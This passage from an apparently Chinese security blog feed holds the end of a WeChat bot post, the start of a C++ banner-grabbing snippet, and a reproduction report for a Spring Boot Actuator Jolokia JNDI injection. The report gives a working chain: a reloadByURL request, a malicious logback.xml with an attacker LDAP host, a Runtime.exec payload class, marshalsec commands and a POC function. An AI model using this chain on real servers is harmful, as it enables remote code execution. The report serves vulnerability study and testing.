class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的话，给大家推荐一个开源库，其实微信整个内容的逆向还是很麻烦复杂的，搞懂了大概的原理和基本操作就行了，除非以这个为饭碗，我这个微信机器人通过逆向做了一部分也做不下去了，最后还是选择了其他人的方案。WeChatSDK提供方便操作PC端微信的超级接口，提供包括多开、防撤销、语音备份、消息发送、加好友等接口。第三方可以直接使用WeChatSDK来开发自己的应用，不用再在分析微信功能、协议上耗费精力，WeChatSDK替你完成所有这些事情。</p><hr><p>题外话：关于淘宝联盟</p><p>最后，给大家普及一下淘宝联盟这个平台。淘宝联盟发展了十余年，主要目的是为了推广淘宝卖家的商品。淘宝联盟提供一些商家设置的优惠券（不显示在淘宝中，也就是一些平台所说的内部优惠券）和佣金(这个佣金就是商家会把你付款买东西的钱拿出一定比例作为你推广的资金)，也就出现了所谓的购物返利模式。大家可以下载一个淘宝联盟这个APP，你会觉得自己发现了新大陆。我之所以做了一个机器人，一开始肯定也想通过这个赚点钱，但是人很少，又不屑于到处拉人推广，又觉得这是个实实在在的优惠，所以现在已经打算把这个机器人做成一个非盈利的账号</p><p>为什么会做这么一个吃力不讨好的东西呢？主要还是接触到了这个东西，最初用了一个熊猫省钱类似的返利机器人，它们说的是返利80%，于是我就找人开了一个高级账号验证了一下，发现他们实际返利比例不足50%，所以我就做了一个这个东西。</p><p>END。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这篇文章主要分析一下微信消息接收与发送的一些相关内容。我会首先把微信消息的发送和接收的技术要点和一些概念罗列一下，好让大家有个大致的概念。最后会再絮叨一下淘宝联盟。&lt;/p&gt;
&lt;h2 id=&quot;0x01微信自动化的3种方式&quot;&gt;&lt;a href=&quot;#0x01微信自动化的3种方式&quot; 
      
    
    </summary>
    
    
      <category term="逆向工程" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="微信" scheme="http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1/"/>
    
      <category term="API" scheme="http://yoursite.com/tags/API/"/>
    
  </entry>
  
  <entry>
    <title>spring boot actuator jolokia 漏洞复现报告</title>
    <link href="http://yoursite.com/2019/12/03/Spring-Boot-Actuator-Jolokia/"/>
    <id>http://yoursite.com/2019/12/03/Spring-Boot-Actuator-Jolokia/</id>
    <published>2019-12-03T01:11:08.152Z</published>
    <updated>2019-12-11T01:10:57.520Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞测试环境"><a href="#0x01-漏洞测试环境" class="headerlink" title="0x01 漏洞测试环境"></a>0x01 漏洞测试环境</h3><p>一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文使用了Java的JNDI注入，JNDI可以对接RMI服务，也可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。<br><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0nuahkjj30hs07ldg0.jpg" alt="OracleRMIAndLDAP"><br>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u182、7u191、6u201之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。因此该测试环境需要在以下基本版本下编译，漏洞才生效。</p><h3 id="0x02-Spring-Boot-Actuator介绍"><a href="#0x02-Spring-Boot-Actuator介绍" class="headerlink" title="0x02 Spring Boot Actuator介绍"></a>0x02 Spring Boot Actuator介绍</h3><p>Spring Boot Acuator 可以帮助你监控和管理Spring Boot应用，比如健康检查、审计、统计和HTTP追踪等。所有的这些特性可以通过JMX或者HTTP endpoints来获得。也就是说 Acuator 可以通过原生的端点(endpoint)来执行，常用的原生端点有 health、env、info，对于web应用而言，可以通过 JMX 来获得，该JMX就是jolokia。</p><p>参考资料：</p><ul><li><a href="https://www.secrss.com/articles/9862" target="_blank" rel="noopener">SpringBoot命令执行漏洞分析与PoC</a></li><li><a href="https://www.freebuf.com/news/193509.html" target="_blank" rel="noopener">Springboot之actuator配置不当的漏洞利用</a></li></ul><h3 id="0x03-jolokia介绍"><a href="#0x03-jolokia介绍" class="headerlink" title="0x03 jolokia介绍"></a>0x03 jolokia介绍</h3><p>Jolokia是一个用来访问远程JMX MBeans的方法，它可以利用JSON通过Http实现JMX远程管理的开源项目，即允许对所有已经注册的MBean进行Http访问，具有快速、简单等特点。除了支持基本的JMX操作之外，它还提供一些独特的特性来增强JMX远程管理如：批量请求，细粒度安全策略等。</p><p>那JMX又是什么呢？<br>JMX：（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。</p><p>参考资料：</p><ul><li><a href="https://blog.csdn.net/yang382197207/article/details/12911855" target="_blank" rel="noopener">jolokia 学习心得</a></li><li><a href="https://blog.csdn.net/lmy86263/article/details/71037316" target="_blank" rel="noopener">理解JMX之介绍和简单使用</a></li></ul><h3 id="0x04-JNDI-RMI-LDAP-介绍"><a href="#0x04-JNDI-RMI-LDAP-介绍" class="headerlink" title="0x04 JNDI/RMI/LDAP 介绍"></a>0x04 JNDI/RMI/LDAP 介绍</h3><p>N/D服务是Naming Service 和 Directory Service ，就是JNDI的命名服务和目录服务。</p><p>JNDI，JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的BlackHat大会上web议题重点讲到，JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。</p><p>RMI, Remote Method Invocation 是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。</p><p>LDAP是开放的Internet标准，支持跨平台的Internet协议，在业界中得到广泛认可的，并且市场上或者开源社区上的大多产品都加入了对LDAP的支持，因此对于这类系统，不需单独定制，只需要通过LDAP做简单的配置就可以与服务器做认证交互。“简单粗暴”，可以大大降低重复开发和对接的成本。</p><p>marshalsec 是一个可以方便的开启 RMI 和 LDAP 服务的工具。</p><blockquote></blockquote><p>开启rmi服务<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <a href="http://VPS/ExportObject" target="_blank" rel="noopener">http://VPS/ExportObject</a> 1099<br>开启ldap服务<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.L</p><p>参考资料：</p><ul><li><a href="https://blog.sari3l.com/posts/469de5e6/" target="_blank" rel="noopener">JNDI/LADP 学习</a></li><li><a href="https://ep.heibai.org/post/1360.html" target="_blank" rel="noopener">漏洞复现丨快速开启RMI&amp;&amp;LDAP</a></li></ul><h3 id="0x05-logback-JMXConfigurator-中的“reloadByURL”函数详解"><a href="#0x05-logback-JMXConfigurator-中的“reloadByURL”函数详解" class="headerlink" title="0x05  logback JMXConfigurator 中的“reloadByURL”函数详解"></a>0x05  logback JMXConfigurator 中的“reloadByURL”函数详解</h3><p>logback JMXConfigurator 允许通过 JMX 来配置 logback。简单来说就是，它允许你从默认配置文件，指定的文件或者 URL 重新配置 logback，列出 logger 以及修改 logger 级别。jolokia在logback JMXConfigurator中提供的“reloadByURL”方法允许我们从外部URL重新加载日志的记录配置。 对于我们来说，只需导航到以下内容即可触发：<br><a href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml" target="_blank" rel="noopener">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml</a> </p><p>logback JMXConfigurator中提供以下几个操作：</p><ul><li>使用默认配置文件重新加载 logback 的配置</li><li>通过指定的 URL 重新加载配置</li><li>通过指定的文件重新加载配置</li><li>设置指定的 logger 的级别。想要设置为 null，传递 “null” 字符串就可以</li><li>获取指定 logger 的级别。返回值可以为 null</li><li>或者指定 logger 的有效级别</li></ul><h3 id="0x06-如何找到利用点"><a href="#0x06-如何找到利用点" class="headerlink" title="0x06 如何找到利用点"></a>0x06 如何找到利用点</h3><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0o4s7wwj31m40g8gp3.jpg" alt="Screen Shot 2019-12-10 at 20.21.35"><br>参见官网给出的文档显示，jolokia列出了所有可以被操作的Mbean。在前面我们也看到了，在http请求中，其中的一项是Mbean name。下面我们还可以从源码的角度看一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.jmx.interceptor.DefaultMbeanServerInterceptor.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(ObjectName name, String operationName,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Object params[], String signature[])</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> InstanceNotFoundException, MBeanException,</span></span><br><span class="line"><span class="function">                   ReflectionException </span>&#123;</span><br><span class="line"></span><br><span class="line">        name = nonDefaultDomain(name);</span><br><span class="line"></span><br><span class="line">        DynamicMBean instance = getMBean(name);</span><br><span class="line">        checkMBeanPermission(instance, operationName, name, <span class="string">"invoke"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> instance.invoke(operationName, params, signature);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            rethrowMaybeMBeanException(t);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码的大致意思也就明白了，就是最终执行的时候是通过getMBean这个函数来得到一个实例，然后这个实例执行后面的操作。</p><p>在该测试中我们已经找到的Spring Boot Acuator 程序中的一个 reloadByURL 的利用点，利用该函数可以加载任意外部资源，并且具备解析xml文档的功能。那么就可以利用xml文件中 insertFromJNDI 标签，该标签可以加载任意Java类，从而实现远程Java命令执行，在16年blackhat中有一场关于N/D服务以及恶意类绑定的演讲，其中详细描述了 如何利用 JNDI 实现 Java应用程序的远程执行。</p><h3 id="0x07-POC构造"><a href="#0x07-POC构造" class="headerlink" title="0x07  POC构造"></a>0x07  POC构造</h3><p>我们大概了解了该程序的漏洞位置以及相应的原理，如何构造有效的POC还是一个漏洞利用的重点。<br>先看一下<strong>JmxExecRequest</strong>的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jolokia.request.JmxExecRequest.java</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor for creating a JmxRequest resulting from an HTTP GET request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pObjectName name of MBean to execute the operation upon. Must not be null.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pOperation name of the operation to execute. Must not be null.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pArguments arguments to to used for executing the request. Can be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pParams optional params used for processing the request.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> MalformedObjectNameException if the object name is not in proper format</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  JmxExecRequest(String pObjectName,String pOperation,List pArguments,</span><br><span class="line">                     ProcessingParameters pParams) <span class="keyword">throws</span> MalformedObjectNameException &#123;</span><br><span class="line">          <span class="keyword">super</span>(RequestType.EXEC, pObjectName, <span class="keyword">null</span> <span class="comment">/* path is not supported for exec requests */</span>, pParams);</span><br><span class="line">          operation = pOperation;</span><br><span class="line">          arguments = pArguments;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>JmxExecRequest总共有4个参数，其中pObjectName是Mbean的名称（不能为空），pOperation 是要执行的操作，不能为空，pArguments 是要执行请求的参数，可以为空，pParams是用来请求的可选参数（optional）。所以下面看一下JmxRequestFactory.createGetRequest是怎么得到 pathInfo的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jolokia.http.HttpRequestHandler.java</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> JSONAware <span class="title">handleGetRequest</span><span class="params">(String pUri, String pPathInfo, Map&lt;String, String[]&gt; pParameterMap)</span> </span>&#123;</span><br><span class="line">        String pathInfo = extractPathInfo(pUri, pPathInfo);</span><br><span class="line"></span><br><span class="line">        JmxRequest jmxReq =</span><br><span class="line">JmxRequestFactory.createGetRequest(pathInfo,getProcessingParameter(pParameterMap));</span><br><span class="line">        <span class="keyword">if</span> (backendManager.isDebug()) &#123;</span><br><span class="line">            logHandler.debug(<span class="string">"URI: "</span> + pUri);</span><br><span class="line">            logHandler.debug(<span class="string">"Path-Info: "</span> + pathInfo);</span><br><span class="line">            logHandler.debug(<span class="string">"Request: "</span> + jmxReq.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> executeRequest(jmxReq);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jolokia.util.EscapeUtil.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PATH_ESCAPE = <span class="string">"!"</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">parsePath</span><span class="params">(String pPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Special cases which simply implies 'no path'</span></span><br><span class="line">    <span class="keyword">if</span> (pPath == <span class="keyword">null</span> || pPath.equals(<span class="string">""</span>) || pPath.equals(<span class="string">"/"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> replaceWildcardsWithNull(split(pPath, PATH_ESCAPE, <span class="string">"/"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面两段代码中可以看到，<strong>createGetRequest</strong>函数最终会通过split函数来分割<strong>pathInfo</strong>，其中 <strong>PATH_ESCAPE</strong>的值为”!”，也就是说当!和/在一起的时候，!/ 会被解析为 / 。这样可以用来构造 reloadByUrl的URL值。</p><p>另外，在官网可以查询到 jolokia 的执行语法路径参数。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0obehadj31c90u0n5j.jpg" alt="Screen Shot 2019-12-10 at 19.37.16"></p><blockquote><p>该请求路径也就是 <strong><base url>/exec/<mbean name>/<operation name>/<arg1>/<arg2>/….</arg2></arg1></operation></mbean></strong> </p></blockquote><p>logback Mbean：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0oepeyij31100ggmzd.jpg" alt="Screen Shot 2019-12-10 at 20.08.30"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mbean name 为 ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span><br><span class="line">Operation: reloadByUrl</span><br><span class="line">Params: http:!/!/127.0.0.1!/logback.xml</span><br></pre></td></tr></table></figure><p>因此，最终构造出来的POC代码为：<br>127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByUrl/http:!/!/127.0.0.1!/logback.xml </p><h3 id="0x09-漏洞验证流程"><a href="#0x09-漏洞验证流程" class="headerlink" title="0x09 漏洞验证流程"></a>0x09 漏洞验证流程</h3><ol><li><p>搭建一个简单的HTTP服务器，可用于下载logback.xml</p></li><li><p>“reloadByURL”函数从 <a href="http://127.0.0.1/logback.xml" target="_blank" rel="noopener">http://127.0.0.1/logback.xml</a> 下载新的配置并将其解析为Logback。 此恶意配置应具有以下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"ldap://artsploit.com:1389/jndi"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在易受攻击的服务器上解析此文件时，它会创建与“env-entry-name”参数值中指定的攻击者LDAP服务器的连接，从而导致JNDI进行解析。 恶意的LDAP服务器可以返回具有“引用”类型的对象，以触发在目标应用程序上执行字节码。 </p></li><li><p>创建恶意类，比如实现打开计算器的操作，在构造函数 Exploit() 中写入执行代码，在恶意类加载的时候即可执行恶意代码。然后在8081端口下开启一个HTTP服务，或者使用刚才的8080端口的HTTP服务也可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String returnValue = <span class="string">""</span>;</span><br><span class="line">        BufferedInputStream inputStream = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(command).getInputStream());</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream));</span><br><span class="line">        String lineStr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span>((lineStr = bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">        <span class="keyword">return</span> returnValue; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">exec(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>开启JNDI，使用marshalsec可以很方便的开启JNDI服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8081/<span class="comment">#Exploit 1389</span></span><br></pre></td></tr></table></figure></li><li><p>编写poc suite，该POC较为简单，只需要在_attack下添加一个HTTP请求即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def _attack(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        payload = &quot;/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8080!/logback.xml&quot;</span><br><span class="line">        vul_url = self.url + payload</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(vul_url, headers=headers)</span><br><span class="line">        if r.status_code == 200:</span><br><span class="line">            result[&apos;ShellInfo&apos;] = &#123;&#125;</span><br><span class="line">            result[&apos;ShellInfo&apos;][&apos;Content&apos;] = r.text</span><br><span class="line">        return self.parse_output(result)</span><br></pre></td></tr></table></figure></li></ol><p>最终的测试结果如下：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0onl9syj31mm0u0h1w.jpg" alt="Screen Shot 2019-12-10 at 22.18.04"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-漏洞测试环境&quot;&gt;&lt;a href=&quot;#0x01-漏洞测试环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞测试环境&quot;&gt;&lt;/a&gt;0x01 漏洞测试环境&lt;/h3&gt;&lt;p&gt;一个包含 Spring Boot Actuators 的漏洞应用，该
      
    
    </summary>
    
    
      <category term="安全渗透" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="spring boot" scheme="http://yoursite.com/tags/spring-boot/"/>
    
      <category term="spring boot actuator" scheme="http://yoursite.com/tags/spring-boot-actuator/"/>
    
  </entry>
  
  <entry>
    <title>C++获取服务banner</title>
    <link href="http://yoursite.com/2019/10/24/C++%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1banner/"/>
    <id>http://yoursite.com/2019/10/24/C++获取服务banner/</id>
    <published>2019-10-24T12:40:00.000Z</published>
    <updated>2019-11-03T05:18:08.315Z</updated>
    
    <content type="html"><![CDATA[<p>网上有很多获取服务banner的文章，但大多数都是写的python代码，根据python代码用C++写了一份。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">"argv  error"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    banner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    banner.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    banner_recv = banner.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    print(banner_recv)</span><br><span class="line"></span><br><span class="line">    banner.close()</span><br><span class="line"></span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>看了一下，直接在建立连接之后，服务就会返回一份含有banner的信息。那么直接用C++的socket函数写一遍就OK了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">int</span> iResult;</span><br><span class="line"></span><br><span class="line">SOCKET ConnectSocket = INVALID_SOCKET;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientService</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *sendbuf = <span class="string">"this is a test"</span>;</span><br><span class="line"><span class="keyword">char</span> recvbuf[DEFAULT_BUFLEN];</span><br><span class="line"><span class="keyword">int</span> recvbuflen = DEFAULT_BUFLEN;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// Initialize Winsock</span></span><br><span class="line">iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != NO_ERROR) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"WSAStartup failed: %d\n"</span>, iResult);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// Create a SOCKET for connecting to server</span></span><br><span class="line">ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Error at socket(): %ld\n"</span>, WSAGetLastError());</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// The sockaddr_in structure specifies the address family,</span></span><br><span class="line"><span class="comment">// IP address, and port of the server to be connected to.</span></span><br><span class="line">clientService.sin_family = AF_INET;</span><br><span class="line">clientService.sin_addr.s_addr = inet_addr(<span class="string">"122.51.26.63"</span>);</span><br><span class="line">clientService.sin_port = htons(<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// Connect to server.</span></span><br><span class="line">iResult = connect(ConnectSocket, (SOCKADDR*)&amp;clientService, <span class="keyword">sizeof</span>(clientService));</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">  closesocket(ConnectSocket);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Unable to connect to server: %ld\n"</span>, WSAGetLastError());</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"></span><br><span class="line">  iResult = recv(ConnectSocket, recvbuf, recvbuflen, <span class="number">0</span>);</span><br><span class="line">  <span 